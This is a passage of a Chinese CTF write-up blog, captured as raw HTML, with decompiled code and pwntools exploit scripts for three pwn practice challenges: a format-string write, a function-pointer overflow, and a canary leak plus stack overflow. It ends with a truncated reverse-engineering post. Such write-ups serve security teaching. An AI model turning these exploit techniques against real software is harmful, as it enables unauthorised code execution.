class="hljs-number">0</span>;</span><br><span class="line">  v5 = <span class="hljs-number">0</span>;</span><br><span class="line">  v6 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x64</span>u);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"please tell me your name:"</span>);</span><br><span class="line">  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0xA</span>u);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"leave your message please:"</span>);</span><br><span class="line">  <span class="hljs-built_in">fgets</span>(&amp;s, <span class="hljs-number">100</span>, stdin);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hello %s"</span>, &amp;buf);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"your message is:"</span>);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( pwnme == <span class="hljs-number">8</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"you pwned me, here is your flag:\n"</span>);</span><br><span class="line">    <span class="hljs-built_in">system</span>(<span class="hljs-string">"cat flag"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Thank you!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>两次输入，第一次只能输入10个字符，不够我们构造<code>payload</code>，所以利用第二次输入的格式化字符串漏洞实现任意地址可写，修改<code>pwnme</code>的值，<code>exp</code>如下：</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">pwnme=<span class="hljs-number">0x0804A068</span></span><br><span class="line">payload=p32(pwnme)+<span class="hljs-string">'a'</span>*<span class="hljs-number">4</span>+<span class="hljs-string">'%10$n'</span></span><br><span class="line"><span class="hljs-comment"># io=process('./CGfsb')</span></span><br><span class="line">io=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">37888</span>)</span><br><span class="line">io.sendlineafter(<span class="hljs-string">'name:'</span>,<span class="hljs-string">'a'</span>)</span><br><span class="line">io.recvuntil(<span class="hljs-string">'please:'</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>很简单，直接输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">cyberpeace</span>{<span class="hljs-number">428</span>fd<span class="hljs-number">5</span>c<span class="hljs-number">839</span>a<span class="hljs-number">04</span>a<span class="hljs-number">6</span>d<span class="hljs-number">162</span>bdd<span class="hljs-number">6610</span>a<span class="hljs-number">094</span>cf}</span><br></pre></td></tr></tbody></table></figure><h4 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h4><p>这道题简单的溢出就可以解决了</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">size_t</span> v0; <span class="hljs-comment">// ebx</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v2[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+10h] [ebp-74h]</span></span><br><span class="line">  <span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*v3)(); <span class="hljs-comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*v4)(); <span class="hljs-comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line">  <span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*v5)(); <span class="hljs-comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line">  <span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*v6)(); <span class="hljs-comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*v7)(); <span class="hljs-comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line">  <span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*v8)(); <span class="hljs-comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line">  <span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*v9)(); <span class="hljs-comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line">  <span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*v10)(); <span class="hljs-comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line">  <span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*v11)(); <span class="hljs-comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line">  <span class="hljs-built_in"><span class="hljs-keyword">int</span></span> (*v12)(); <span class="hljs-comment">// [esp+54h] [ebp-30h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+58h] [ebp-2Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="hljs-keyword">size_t</span> i; <span class="hljs-comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="hljs-number">1</span>;</span><br><span class="line">  v3 = sub_8048604;</span><br><span class="line">  v4 = sub_8048618;</span><br><span class="line">  v5 = sub_804862C;</span><br><span class="line">  v6 = sub_8048640;</span><br><span class="line">  v7 = sub_8048654;</span><br><span class="line">  v8 = sub_8048668;</span><br><span class="line">  v9 = sub_804867C;</span><br><span class="line">  v10 = sub_8048690;</span><br><span class="line">  v11 = sub_80486A4;</span><br><span class="line">  v12 = sub_80486B8;</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"What is your name?"</span>);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"&gt; "</span>);</span><br><span class="line">  <span class="hljs-built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="hljs-built_in">fgets</span>(&amp;s, <span class="hljs-number">32</span>, stdin);</span><br><span class="line">  <span class="hljs-built_in">sub_80485DD</span>((<span class="hljs-keyword">int</span>)&amp;s);</span><br><span class="line">  <span class="hljs-built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"I should give you a pointer perhaps. Here: %x\n\n"</span>, sub_8048654);</span><br><span class="line">  <span class="hljs-built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Enter the string to be validate"</span>);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"&gt; "</span>);</span><br><span class="line">  <span class="hljs-built_in">fflush</span>(stdout);</span><br><span class="line">  __isoc99_scanf(<span class="hljs-string">"%s"</span>, v2);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )</span><br><span class="line">  {</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v0 &gt;= <span class="hljs-built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> ( v14 )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:</span><br><span class="line">        <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">sub_8048702</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="hljs-number">2</span>;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v2[i] == <span class="hljs-number">64</span> )</span><br><span class="line">          v14 = <span class="hljs-number">3</span>;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:</span><br><span class="line">        <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">sub_804874C</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="hljs-number">4</span>;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v2[i] == <span class="hljs-number">46</span> )</span><br><span class="line">          v14 = <span class="hljs-number">5</span>;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:</span><br><span class="line">        <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">sub_8048784</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="hljs-number">6</span>;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:</span><br><span class="line">        <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">sub_8048784</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="hljs-number">7</span>;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:</span><br><span class="line">        <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">sub_8048784</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="hljs-number">8</span>;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:</span><br><span class="line">        <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">sub_8048784</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="hljs-number">9</span>;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:</span><br><span class="line">        v14 = <span class="hljs-number">10</span>;</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">default</span>:</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  (*(&amp;v3 + --v14))();</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">fflush</span>(stdout);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>有两个输入的地方，第一个地方严格控制了输入的字符数，所以没什么用，第二个用了<code>scanf</code>，可以无限制的输入，利用这个地方来控制我们的程序。</p><p>这个程序开了<code>NX</code>，所以找找有没有可以利用的函数，找到</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_80486CC</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+1Eh] [ebp-3Ah]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">snprintf</span>(&amp;s, <span class="hljs-number">0x32</span>u, <span class="hljs-string">"cat %s"</span>, <span class="hljs-string">"./flag"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">system</span>(&amp;s);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>接下来考虑怎么利用。程序最后会根据<code>v14</code>的值来判断该执行那个函数，看到有些人想要覆盖<code>v14</code>的值，我的做法就是保留<code>v14=1</code>然后去替换<code>v3</code>的值，因为即使替换掉<code>v14</code>，后面也会被修改。</p><p>下一步就是要控制<code>v14</code>的值不变，我的做法是在写入的时候先写入一个<code>'\0'</code>，这样判断字符串长度的时候为0，直接跳出循环。<code>exp</code>如下：</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-comment"># io=process('./forgot')</span></span><br><span class="line">io=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">40669</span>)</span><br><span class="line">io.recvuntil(<span class="hljs-string">'&gt;'</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">'a'</span>)</span><br><span class="line">payload=<span class="hljs-string">'\0'</span>+<span class="hljs-string">'A'</span>*<span class="hljs-number">0x1f</span>+p32(<span class="hljs-number">0x80486cc</span>)</span><br><span class="line">io.recvuntil(<span class="hljs-string">'&gt;'</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>得到flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">cyberpeace</span>{<span class="hljs-number">3</span>a<span class="hljs-number">2</span>c<span class="hljs-number">567</span>e<span class="hljs-number">832</span>c<span class="hljs-number">79478</span>c<span class="hljs-number">593</span>e<span class="hljs-number">5</span>f<span class="hljs-number">6</span>f<span class="hljs-number">334830</span>}</span><br></pre></td></tr></tbody></table></figure><h4 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h4><p>题目里面一共有两个漏洞，并且都标明出来了，不需要自己去找</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall __noreturn <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  <span class="hljs-built_in">sub_4009FF</span>();</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Welcome to the battle ! "</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"[Great Fairy] level pwned "</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Select your weapon "</span>);</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">sub_4009DA</span>();</span><br><span class="line">      __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v3);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-built_in">sub_4008EB</span>();</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bye "</span>);</span><br><span class="line">      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )</span><br><span class="line">      <span class="hljs-built_in">sub_400960</span>();</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wrong!"</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_4009DA</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1. Stack Bufferoverflow Bug "</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2. Format String Bug "</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3. Exit the battle "</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>选择2的话会进入一个包含格式化字符串漏洞的函数，选择1会进入一个有栈溢出漏洞的函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//格式化字符串</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sub_4008EB</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x7F</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//栈溢出</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sub_400960</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"-&gt; %s\n"</span>, &amp;buf);</span><br><span class="line">  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//目标函数</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_4008DA</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">system</span>(<span class="hljs-string">"/bin/cat ./flag"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果<code>checksec</code>或者直接看到<code>v2</code>就可以发现，这个程序开了<code>cannary</code>保护，所以直接溢出是不行的，这时候可以考虑利用格式化字符串漏洞泄露<code>cannary</code>的值，因为进程没有中止就进入了下一个循环，所以<code>cannary</code>的值是不变的，这个时候选择利用栈溢出漏洞，覆盖返回地址为目标函数即可。这里虽然是64位，但是调用的函数没有参数，没必要构造很复杂的ROP链来控制程序执行流程。</p><p><code>exp</code>如下：</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">sys_addr=<span class="hljs-number">0x4008da</span></span><br><span class="line"><span class="hljs-comment"># io=process('./Mary_Morton')</span></span><br><span class="line">io=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">39178</span>)</span><br><span class="line">io.recvuntil(<span class="hljs-string">"3. Exit the battle \n"</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">"2"</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">"%23$p"</span>)</span><br><span class="line">cannary= <span class="hljs-built_in">int</span>(io.recvline().strip(<span class="hljs-string">'\n'</span>),<span class="hljs-number">16</span>)</span><br><span class="line"><span class="hljs-built_in">print</span> cannary</span><br><span class="line">io.recvuntil(<span class="hljs-string">"3. Exit the battle \n"</span>)</span><br><span class="line">io.sendline(<span class="hljs-string">"1"</span>)</span><br><span class="line">payload=<span class="hljs-string">""</span></span><br><span class="line">payload+=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x88</span></span><br><span class="line">payload+=p64(cannary)</span><br><span class="line">payload+=p64(<span class="hljs-number">0</span>)</span><br><span class="line">payload+=p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>得到flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">cyberpeace</span>{<span class="hljs-number">8</span>b<span class="hljs-number">06</span>a<span class="hljs-number">4</span>becaf<span class="hljs-number">5</span>e<span class="hljs-number">73</span>cd<span class="hljs-number">79</span>ea<span class="hljs-number">7</span>d<span class="hljs-number">283</span>d<span class="hljs-number">0</span>bd<span class="hljs-number">89</span>}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-re部分题解（四）</title>
      <link href="/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>最近比较忙，而且题目越做越快，平时的练习除非特别值得注意的，都不会写的太详细了</p><span id="more"></span><h4 id="serial-150"><a href="#serial-150" class="headerlink" title="serial-150"></a>serial-150</h4><p>这题本身的算法没什么难度，主要就是花指令的去除，去除之后就只是简单的字符串比较了，很容易。</p><figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EZ<span class="hljs-number">9</span>dmq<span class="hljs-number">4</span>c<span class="hljs-number">8</span><span class="hljs-name">g9</span><span class="hljs-name">G7</span>bAV</span><br></pre></td></tr></tbody></table></figure><h4 id="testre"><a href="#testre" class="headerlink" title="testre"></a>testre</h4><p>主要就是一个base58，很好做，尝试了一下ghidra的效果发现不尽如人意，所以主要还是采用IDA做题。</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{base<span class="hljs-number">58</span>_is_boring}</span><br></pre></td></tr></tbody></table></figure><h4 id="simple-check-100"><a href="#simple-check-100" class="headerlink" title="simple-check-100"></a>simple-check-100</h4><p>这题没什么好写的，虽然前面的check函数进行了检测，但是后面的计算和前面的输入没什么关系，并且直接把flag给输出了，所以直接gdb调试改了<code>eax</code>的值直接输出flag就好了</p><figure class="highlight erlang-repl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_is_you_know_cracking!!!</span><br></pre></td></tr></tbody></table></figure><h4 id="secret-string-400"><a href="#secret-string-400" class="headerlink" title="secret-string-400"></a>secret-string-400</h4><p>一直不知道这是什么，后来发现这竟然是个压缩包，里面有个网页和调用的js，js里面可以看到把机器码转成了命令然后执行，所以在执行之前输出一下</p><figure class="highlight livecodeserver hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">command</span>);</span><br></pre></td></tr></tbody></table></figure><p>在console里找到了关键判断</p><figure class="highlight stata hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 